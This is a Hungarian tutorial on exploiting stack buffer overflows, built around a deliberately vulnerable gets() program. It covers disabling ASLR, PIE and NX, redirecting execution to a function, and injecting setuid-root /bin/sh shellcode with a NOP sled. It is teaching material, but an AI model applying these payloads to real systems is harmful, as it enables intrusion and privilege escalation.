# A buffer overflow támadás

## Egy egyszerű C program

Írjunk egy nagyon egyszerű C programot `teszt.c` néven.
A fenti program az `a`, `b` és `c` változókat feltölti egy-egy értékkel, majd kiírja azok értékét és címét.

```c
#include <stdio.h>

int main()
{
    int a, b, c;

    a = 0x28;
    b = 0x75;
    c = 0xd6;

    printf("a: %x\n", a);
    printf("&a: %lx\n", &a);
    
    printf("b: %x\n", b);
    printf("&b: %lx\n", &b);
    
    printf("c: %x\n", c);
    printf("&c: %lx\n", &c);
    
    return 0;
}
```

Fordítsuk le:

```bash
gcc teszt.c -o teszt
```

Majd indítsuk el:

```bash
./teszt
```

A proram kiírja a három változó értékét, valamint azok címét is.

## A gdb debugger

Telepítsük a `gdb` csomagot.

```bash
sudo apt-get install gdb
```

Most fordítsuk le a programot úgy, hogy a `gdb` debuggerben forrásszinten tudjuk nyomkövetni:

```bash
gcc -g teszt.c -o teszt
```

Indítsuk el a debuggert:

```bash
gdb teszt
```

Állítsunk be egy töréspontot a `main` függvény elején.

```
break main
```

Majd futtassuk a programot. (Meg fog állni a legelején a töréspont miatt.)

```
r
```

A debuggerben ki tudjuk iratni változók értékét, illetve azok címét a `print` (röviden `p`) paranccsal.

```
p a
p &a
```

A fenti két parancs az `a` változó értékét, majd annak címét írja ki.

Most az `n` paranccsal tudjuk lépésenként futtatni a programot, a `p`-vel pedig változól értékét tudjuk kiiratni, vagy a `c`
(continue) paranccsal tudjuk a következő breakpointig, vagy a program végéig futtatni a programot.

A változók címe megegyezik a programban kiírt, illetve a debuggerből lekért érték esetén is.

A programot a debuggeren kívül a következő módon futtathatjuk:
```bash
./teszt
```

Ha a programot a
debuggeren kívül futtatjuk, a címek minden alkalommal megváltoznak.

## Változók helye a memóriában

A C nyelven írt programok lokális változói a veremben (stack) helyezkednek el. Ezek tehát olyan memóriacímek, amik a
veremterületen helyezkednek el. A később bemutatott sebeszhetőség ellen a rendszer memóriaterületek címének véletlenszerűsítésével
védekezik. Ezt a következő paranccsal kapcsolhatjuk ki:

```
sudo bash
echo 0 > /proc/sys/kernel/randomize_va_space
exit
```

Most a programunk ugyanazt a 3 címet fogja kiírni, amit a debuggerben is láttunk.

Most vizsgáljuk meg azt a memóriaterületet, ahol a változók vannak. Tegyünk egy töréspontot a `main` függvénynek az elejére,
indítsuk el a programot, majd irassunk ki a veremmutatótól (`$sp`) kezdve 40 db 32 bites értéket:

```
b main
r
x/40x $sp
```

Majd léptessünk a programon (`n`), és vizsgáljuk meg ugyanezt a területet az `x/40x 0x7fffffffe370` utasítással.
(Az itt szereplő memóriacím volt az előbbi lista kezdőcíme.)

Látható, hogy az első érték már megjelent. Ezt ismételve a többi értékadás eredménye is láthatóvá válik.

A stack nem csak a lokális változókat tárolja, hanem többek közt azt a memóriacímet is, ahova majd a függvényből való
kilépéskor ugrani kell. Erről az `info frame` paranccsal kapunk információt. A `saved rip` maga a memóriacím,
a `rip at` után pedig ennek helye látható. Keressük meg ezt is a listában.

## Adatbekérést végző program

Most írjuk át programunkat a következőre:

```c
#include <stdio.h>

int main(int argc, char** argv)
{
  int a = 0x28;
  int b = 0x75;
  int c = 0xd6;
  char buffer[16];

  gets(buffer);
}
```

A program fordításakor több figyelmeztetést is kapunk a `gets` függvény veszélyessége és rendszerből való kivezetése miatt.
Ennek ellenére maga a program működni fog. Működése annyiból áll, hogy a `buffer` tömböt feltölti a felhasználó által
beírt betűkkel. Ahhoz, hogy a `main` függvényt végig lefuttassuk, de az még ne lépjen ki, a legutolsó assembly nyelvű
utasításra (ez egy `ret` utasítás) kell egy töréspontot betenni:

```
disassembly main
break *0x00000000000011be
```

Ha most futtatjuk a programot az `r` paranccsal, a debugger hibaüzenetet fog adni. Ennek az oka a dinamikus címgenerálás.
A program indítása után már a tényleges memóriacímeket látjuk. Most az egyszerűség kedvéért a programot a dinamikus
címgenerálás nélkül fogjuk fordítani. Ezt a `-no-pie -fno-pie` kapcsolókkal fogjuk fordítani:

```bash
gcc teszt.c -o teszt -g -no-pie -fno-pie
```

Most a visszafejtett programkódnál egész más címek jelennek meg. Ha ezek alapján hozzuk létre a töréspontot,
akkor az már helyes működést fog eredményezni:

```
disassembly main
break *0x00000000004011a1

```

Hasonlóan az előző példához, most már meg tudjuk nézni, hogy az általunk beírt karakterek hova kerülnek a veremben.
Ahelyett, hogy ezeket minden alkalommal kézzel írnánk be, készíthetünk egy progamot is (például Python nyelven),
ami a kívánt bemenetet előállítja. Itt a programkód első 3 sora aktív, a többi ki van kommentezve. Ezekből
fokozatosan sorokat aktiválva tudunk hosszabb bemeneteket előállítani.

```python
import sys

sys.stdout.buffer.write(bytes.fromhex('11111111'))
sys.stdout.buffer.write(bytes.fromhex('22222222'))
sys.stdout.buffer.write(bytes.fromhex('33333333'))
#sys.stdout.buffer.write(bytes.fromhex('44444444'))
#sys.stdout.buffer.write(bytes.fromhex('55555555'))
#sys.stdout.buffer.write(bytes.fromhex('66666666'))
#sys.stdout.buffer.write(bytes.fromhex('77777777'))
#sys.stdout.buffer.write(bytes.fromhex('88888888'))
#sys.stdout.buffer.write(bytes.fromhex('99999999'))
#sys.stdout.buffer.write(bytes.fromhex('11111111'))
#sys.stdout.buffer.write(bytes.fromhex('aaaaaaaa'))
#sys.stdout.buffer.write(bytes.fromhex('bbbbbbbb'))
#sys.stdout.buffer.write(bytes.fromhex('cccccccc'))
#sys.stdout.buffer.write(bytes.fromhex('dddddddd'))

```

Ezt, `geninput.py` néven elmentve irányítsuk át a kimenetét:

```bash
python geninput.py > bemenet
```

Majd a debuggerben indítsuk úgy a programot, hogy a bemenetét innen vegye:

```
r < bemenet
```

Kísérletezzünk különböző hosszúságú bemenetekkel! Egy idő után felül fogjuk írni a visszatérési címet. Ekkor a függvényből
való visszatéréskor szegmenshibát fog kiírni a program, hiszen egy véletlenszerű címre akar ugrani.

## Célzott átirányítás

Helyezzünk el a program elején egy `win` nevű függvényt, amit semelyik másik függvényből ne hívjunk meg. A feladat
az lesz, hogy a programot mégis ennek a függvénynek a meghívására kényszerítsük.


```c
#include <stdio.h>

void win()
{
  printf("Nyertel.\n");
}

int main()
{
  int a = 5;
  int b = 18;
  int c = 183;
  char szoveg[16];
  printf("Cim: %x\n", szoveg);

  gets(szoveg);
}
```

Először is szükséges a `win` függvény memóriacíme:

```
p &win
```

A keresett memóriacím `0x401146`. Az aktuális visszatérési címról az `info frame` ad felvilágosítást, miután a program
már fut.

Most használjuk fel az előbbi bemenetnek egy viszonylag rövid verzióját, ami még nem írja felül a visszatérési
címet (nem okoz szegmentációs hibát). Futtassuk le a programot úgy, hogy az utolsó utasításon megállítjuk, és
vizsgáljuk meg a stack-et.

Az utolsó utasítás címének meghatározása és a töréspont beszúrása:

```
disassembly main
break *0x00000000004011a1
```

(A `0x00000000004011a1` a `main` függvény utolsó (`ret`) utasítása.)

Futtatás az előkészített bemenettel:

```
r < bemenet
```

Stack frame vizsgálata:

```
info frame
```

A számunkra fontos adatok a következők:

```
saved rip = 0x7ffff7e0224a
```
Vagyis a mentett visszatérési cím `0x7ffff7e0224a`. Ezt kell keresnünk a stack-en.

```
rip at 0x7fffffffe388
```
Ami a mentés helye (a stack-en).

Most vizsgáljuk meg magát a stack-et is. Mivel a program végén vagyunk, a stack pointert valamennyivel (mondjuk
40 byte-tal) vissza kell állítani.

```
x/40x $sp-40
```

Most láthatjuk, hogy hol van tárolva a visszatérési cím és hogy hány byte beírása szükséges még addig. Egészítsük
ki a helykitöltő adatsorunkat pontosan ennyivel, majd adjuk hozzá a `win` függvény címét is. Ügyeljünk arra,
hogy ez egy 64 bites adat, illetve bevitelkor fordított bájtsorrend szükséges.

A `win` függvény címe:

```
0x401146
```

64 bitre kiegészítve:
```
0x0000000000401146
```

A szükséges Python kód a `geninput.py`-ban:
```python
sys.stdout.buffer.write(bytes.fromhex('46114000'))
sys.stdout.buffer.write(bytes.fromhex('00000000'))
```

Ha mindent jól csináltunk, a `win` függvény lefut (majd a program szegmentálási hibával leáll, mivel összezagyváltuk
a stack-et).

Az igazi teszt természetesen az, ha a programot a debuggeren kívül futtatjuk:

```bash
./teszt < bemenet
```

Ha mindent jól csináltunk, akkor természetesen ebben az esetben is le fog futni a `win()` függvény.

## Kód a stack-en

A fenti módszerrel a kód már létező részeire tudunk ugrani, ha tudjuk azok címét. Ez sok esetben már
éppen elég nagy sebezhetőség, de tetszőleges kód futtatására is lehetőségünk van, ha azt
előzőleg a stack-en helyezzük el. Erre a fordító és a rendszer (együtt) ad egy beépített védelmet:
A stack-en levó kód végrehajtása le van tiltve. Természetesen ez csak akkor működik, ha a
processzor támogatja ezt (így például egy egyszerű 8 bites beágyazott rendszer esetében nem).

A védelem kiiktatása az adott kód fordítása közben a `-z execstack` fordítási opcióval lehetséges.

A következő kérdés az, hogy egyáltalán milyen kódot érdemes futtatni. A támadó (akinek most a
szerepében vagyunk) célja általános esetben egy shell indítása, lehetőleg privilegizált jogokkal,
de elképzelhetőek más lehetéges támadások is (például a tűzfal, vagy az illető számítógép lekapcsolása).
Ezekre láthatunk jónéhány példát ezen az oldalon:
[https://shell-storm.org/shellcode/index.html](https://shell-storm.org/shellcode/index.html).

Innen a `Linux/x86-64 - setuid(0) + execve(/bin/sh)` nevű pont jó lesz a shell indításához. Ennek bináris kódja
egy kicsit átformázva:

```
4831ffb0
690f0548
31d248bb
ff2f6269
6e2f7368
48c1eb08
534889e7
4831c050
574889e6
b03b0f05
6a015f6a
3c580f05
```

Az ilyen típusú bináris programrészlet neve shell-kód.

A shell-kód elhelyezése vagy a visszatérési cím előtt, vagy után lehetséges. Ez a 48 bájt a pufferterületre nem
fér be, így csak a visszatérési cím után tudjuk elhelyezni. Így a visszatérési címet generáló kódrészlet után a következőt
kell beszúrni:

```python
sys.stdout.buffer.write(bytes.fromhex('4831ffb0'))
sys.stdout.buffer.write(bytes.fromhex('690f0548'))
sys.stdout.buffer.write(bytes.fromhex('31d248bb'))
sys.stdout.buffer.write(bytes.fromhex('ff2f6269'))
sys.stdout.buffer.write(bytes.fromhex('6e2f7368'))
sys.stdout.buffer.write(bytes.fromhex('48c1eb08'))
sys.stdout.buffer.write(bytes.fromhex('534889e7'))
sys.stdout.buffer.write(bytes.fromhex('4831c050'))
sys.stdout.buffer.write(bytes.fromhex('574889e6'))
sys.stdout.buffer.write(bytes.fromhex('b03b0f05'))
sys.stdout.buffer.write(bytes.fromhex('6a015f6a'))
sys.stdout.buffer.write(bytes.fromhex('3c580f05'))

```

Most már csak az ugrási címet kell átírni. Ezt a stack listájának segítségével nyerhetjük ki. A címet természetesen
fordított bájtsorrendben kell beírni. Ha például az ugrási cím `00007fffffffe390`, akkor a szükséges két sor:

```python
sys.stdout.buffer.write(bytes.fromhex('10e4ffff'))
sys.stdout.buffer.write(bytes.fromhex('ff7f0000'))
```

Ezeket tehát a helykitöltő adatok és a shell-kód közé kell tenni, a másik példában használt ugrási cím helyére.

Mielőtt kipróbálnánk a debuggeren kívül futtatni a programot a generált bemenettel, végezzünk el
egy tesztet. Irassuk ki a puffer memóriacímét (bővítsük ki a programot a következő sorral):

```c
printf("%x\n", buffer);
```

Ha kipróbáljuk a debuggerben és azon kívül, más eredményt kapunk, ami azt jelenti, hogy a stack
jónéhány byte-tal el van csúszva. Ha a programot más helyről indítjuk, szintén más lesz az eredmény.
Ennek oda az, hogy a stack-ben vannak a környezeti változók is, többek közt az aktuális könyvtárt
tartalmazó `PWD` is, aminek a hossza más és más az egyes esetekben.

A shell-kódot tehát akkor is el kell találni, ha az nem mindig pontosan ugyanazon a memóriacímen foglal helyet.
Erre egy megoldás az, ha a shell-kód elé jónéhány (mondjuk 256 db) `NOP` utasítást szúrunk be és a 256 byte-os
`NOP`-mező közepére ''lőjük be'' a memóriacímet. Így mindkét irányban 128 byte-os elcsúszást tudunk tolerálni.

A `NOP` egy egy bájtos uasítás, aminek kódja `0x90`. A következő sor 4 byte-nyi `NOP`-ot generál:

```python
sys.stdout.buffer.write(bytes.fromhex('90909090'))
```

Ebből kell tehát 64 sornyi, valamint az ugrási címet kell 128-cal növelni.

Most próbáljuk meg a teszt bemenettel újra futtatni a programot. A shell nem jelenik meg, viszont
szegmentációs hibát sem kapunk. A magyarázat: A shell elindul, de amint vége a bemenetnek (ami
a programot ''kiakasztó'' fájlunk, kilép a shell is. Valahogy meg kell oldanunk, hogy miután a programnak
átadtuk a bemenetet, tudjunk újabb bemenetet is adni, billentyűzetről. Ehhez jön jól a `cat` parancs,
ami bemeneti fájl megadása nélkül a standard bemenetről veszi a bemenetet. A teljes parancs tehát:

```bash
(cat bemenet ; cat) | ./teszt
```

Amennyiben a `teszt` programot előzőleg setuid root jogokkal láttuk el, a shellünk is root jogú lesz,
kivéve ha az adott fájlrendszeren aktív a `nosuid` opció (és rendszerünket úgy telepítettük, hogy ez
így legyen). A `teszt` program tehát még setuid root beállítás esetén is csak akkor fog root jogot adni
egy buffer overflow támadás esetén, ha olyan fájlrendszerről fug, amin nincs bekapcsolva a `nosuid`
opció. (A `/tmp` például ilyen.)

